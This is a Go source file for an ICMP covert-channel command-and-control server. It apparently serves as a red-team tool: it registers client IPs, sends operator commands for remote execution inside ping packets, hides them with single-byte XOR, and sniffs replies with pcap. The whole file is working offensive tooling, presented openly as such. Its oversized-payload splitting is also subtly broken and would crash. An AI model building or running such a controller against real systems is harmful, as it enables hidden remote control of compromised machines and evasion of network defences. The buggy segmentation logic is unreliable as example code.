package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// var clients []client

// type client struct {
// 	name string
// 	id   int
// 	ip   string
// }

var DEBUG bool = true

var id int = 0
var clients = make(map[int]string)
var SSM bool = true
var execute = false
var PACKETQUEUE []icmp.Message
var KEY rune = 'b'

var (
	buffer = int32(1600)
	filter = "icmp[icmptype] == icmp-echoreply"
)

const (
	ProtocolICMP = 1
)

func print_title() {
	fmt.Println(".__                          ___             .__.__    ___")
	fmt.Println("|__| ____  __ ________      /  /   _______  _|__|  |   \\  \\")
	fmt.Println("|  _/ ___\\|  |  \\____ \\    /  /  _/ __ \\  \\/ |  |  |    \\  \\")
	fmt.Println("|  \\  \\___|  |  |  |_> >  (  (   \\  ___/\\   /|  |  |__   )  )")
	fmt.Println("|__|\\___  |____/|   __/    \\  \\   \\___  >\\_/ |__|____/  /  /")
	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
	fmt.Println("Type \"help\" for list of commands.")

}

func print_help() {
	fmt.Println("\tadd <IP ADDRESS>             Adds new client by IP")
	fmt.Println("\tls                           Show all added clients")
	fmt.Println("\trm <ID>                      Removes a client by ID")
	fmt.Println("\tremoveallclients             Removes all clients")
	// fmt.Println("\tsend <ID> <message>          Send message to client at ID")
	fmt.Println("\texe <ID> <command>           Send command to client at ID")
	// fmt.Println("\tsendtoall <message>          Sends <message> to all clients")
	// fmt.Println("\texeonall <command>           Execute <command> on all clients")
	// fmt.Println("\tsendtoteam <team> <command>  Send <command> to all <team> clients")
	// fmt.Println("\texeonteam <team> <command>   Execute <command> on all <team> clients")
	// fmt.Println("\tloadclients                  Loads all clients specified in JSONFILE")
	// fmt.Println("\tcheckalive                   Generates a board of replying clients")
	// [FIX]fmt.Println("\tshell <ID>                   Creates a direct line with client at ID")
	fmt.Println("\tkill                         Stops server")
	fmt.Println("\tssm                          Toggles Super Secret Mode")
	fmt.Println("\tdebug                        Toggles Debug")
	fmt.Println("\thelp                         Prints this")
}

func addclient(ip string) {
	clients[id] = ip
	id += 1
}

func removeclient(id int) {
	if _, ok := clients[id]; ok {
		if DEBUG {
			fmt.Println("Removing client", id)
		}
		delete(clients, id)
	} else {
		fmt.Println("Client does not exist.")
	}
}

func removeallclients() {
	for k := range clients {
		delete(clients, k)
	}
}

func showclients() {
	keys := make([]int, 0, len(clients))
	for k := range clients {
		keys = append(keys, k)
	}
	sort.Ints(keys)
	for _, k := range keys {
		fmt.Print("Client ", k, " at ", clients[k])
	}
}

func generate_header(segment int, segmented bool) string {
	segHeader := strconv.Itoa(segment)
	header := "!!!"
	// ### is server flag, value 1 (SSM) is Encryption option, 2 is execution option
	// 3 is segment for oversized packets, 4 is segment ID
	if SSM {
		header += "1"
	} else {
		header += "0"
	}
	if execute {
		header += "1"
	} else {
		header += "0"
	}
	if segmented {
		header += "1"
	} else {
		header += "0"
	}
	header += segHeader
	return header
}

func generate_packet(payload string, segment int) {
	byteSize := len(payload)
	// Recursivly calls generate packet if too large
	if byteSize > 1460 {
		fmt.Println("Conductor we have a problem!!!!!")
		payload := payload[0:1460]
		nextPayload := payload[1460:byteSize]
		if SSM {
			payload = encrypt_decrypt(payload)
		}
		packet := icmp.Message{
			Type: ipv4.ICMPTypeEcho, Code: 0,
			Body: &icmp.Echo{
				ID: os.Getpid() & 0xffff, Seq: 1,
				Data: []byte(generate_header(segment, true) + payload),
			},
		}
		fmt.Println(len(PACKETQUEUE))
		PACKETQUEUE[segment] = packet
		generate_packet(nextPayload, segment+1)
	} else {
		// Packet if no segmentation is needed
		if SSM {
			payload = encrypt_decrypt(payload)
		}
		packet := icmp.Message{
			Type: ipv4.ICMPTypeEcho, Code: 0,
			Body: &icmp.Echo{
				ID: os.Getpid() & 0xffff, Seq: 1,
				Data: []byte(generate_header(segment, false) + payload),
			},
		}
		fmt.Println(len(PACKETQUEUE))
		PACKETQUEUE[segment] = packet
	}
}

func send_packets(addr string, c icmp.PacketConn) {
	for _, packet := range PACKETQUEUE {
		// fmt.Println("Packet:", addr)
		binaryEncoding, _ := packet.Marshal(nil)
		dst, _ := net.ResolveIPAddr("ip4", addr)
		anInt, err := c.WriteTo(binaryEncoding, dst)

		if err != nil {
			fmt.Println("I FAILED DOG")
		} else if anInt != len(binaryEncoding) {
			fmt.Println("YOU FELL OFF")
		}
	}

}

func deviceExists(name string) bool {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panic(err)
	}
	for _, device := range devices {
		if device.Name == name {
			return true
		}
	}
	return false
}

func sniffer() {
	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handler.Close()
	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}
	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		payload := convert(packet.ApplicationLayer().Payload())
		header := payload[0:7]
		if strings.HasPrefix(header, "###") {
			payload = payload[7:]

			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			ip, _ := ipLayer.(*layers.IPv4)

			if SSM {
				fmt.Print((encrypt_decrypt(payload)), " received from ", ip.SrcIP)
			} else {
				fmt.Print((payload), " received from ", ip.SrcIP)
			}
		} else {
			continue
		}
	}
}

func convert(nums []byte) string {
	var converted string
	converted = bytes.NewBuffer(nums).String()
	return converted
}

func parse_id(id string) int {
	atoiclient, _ := strconv.Atoi(strings.TrimRight(id, "\r\n"))
	return atoiclient
}

func parse_string(unparsed string) string {
	parsed := strings.TrimRight(unparsed, "\r\n")
	return parsed
}

func encrypt_decrypt(plaintext string) string {
	encrypted := ""
	for i := range plaintext {
		encrypted += string(rune(int(plaintext[i]) ^ int(KEY)))
	}
	return encrypted
}

func toggle_ssm() {
	if SSM {
		SSM = false
		fmt.Println("SSM Disabled")
	} else {
		SSM = true
		fmt.Println("SSM Enabled")
	}
}

func toggle_debug() {
	if DEBUG {
		DEBUG = false
		fmt.Println("DEBUG Disabled")
	} else {
		DEBUG = true
		fmt.Println("DEBUG Enabled")
	}
}

func checkIPAddress(host string) bool {
	parts := strings.Split(host, ".")
	if len(parts) < 4 {
		return false
	}
	for _, x := range parts {
		if i, err := strconv.Atoi(x); err == nil {
			if i < 0 || i > 255 {
				return false
			}
		} else {
			return false
		}
	}
	return true
}

func main() {
	print_title()
	// print_help()
	// addclient("127.0.0.1")
	// addclient("127.0.0.2")
	// showclients()
	var ListenAddr = "0.0.0.0"
	c, err := icmp.ListenPacket("ip4:icmp", ListenAddr)
	if err != nil {
		fmt.Println(err)
	}
	go sniffer()
	// devices, _ := pcap.FindAllDevs()
	// for _, device := range devices {
	// 	fmt.Println(device.Name)
	// }

	for {
		consoleReader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")

		input, _ := consoleReader.ReadString('\n')

		input = strings.ToLower(input)

		if strings.HasPrefix(input, "add") {
			tokens := strings.Split(input, " ")
			fmt.Println(tokens[1])
			if checkIPAddress(parse_string(tokens[1])) {
				addclient(tokens[1])
			} else {
				fmt.Println("Invalid IP address.")
			}

		} else if strings.HasPrefix(input, "rm") {
			tokens := strings.Split(input, " ")
			id := parse_id(tokens[1])
			removeclient(id)

		} else if strings.HasPrefix(input, "removeallclients") {
			removeallclients()

		} else if strings.HasPrefix(input, "ls") {
			showclients()

		} else if strings.HasPrefix(input, "exe") {
			// Parse command
			_, after, _ := strings.Cut(input, " ")
			id, command, _ := strings.Cut(after, " ")
			command = strings.TrimRight(command, "\r\n")

			// Create queue for packet sending
			PACKETQUEUE = make([]icmp.Message, (len(command)/1460)+1)

			execute = true

			clientid := parse_id(id)
			ipaddr := strings.TrimRight(clients[clientid], "\r\n")
			generate_packet(command, 0)
			if DEBUG {
				fmt.Print("[DEBUG] ", command, " sent to ", clients[clientid])
			}
			send_packets(ipaddr, *c)

		} else if strings.HasPrefix(input, "help") {
			print_help()

		} else if strings.HasPrefix(input, "ssm") {
			toggle_ssm()

		} else if strings.HasPrefix(input, "debug") {
			toggle_debug()

		} else if strings.HasPrefix(input, "kill") {
			print_title()
			os.Exit(0)

		} else {
			continue
		}
	}
}
